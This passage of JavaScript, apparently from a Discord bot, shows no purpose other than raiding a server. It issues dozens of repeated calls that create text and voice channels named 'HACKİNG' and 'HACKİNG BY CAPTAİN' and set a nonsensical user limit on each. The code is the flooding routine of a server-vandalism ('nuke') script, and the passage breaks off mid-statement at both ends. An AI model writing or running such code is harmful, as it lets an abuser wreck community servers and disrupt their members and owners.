      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
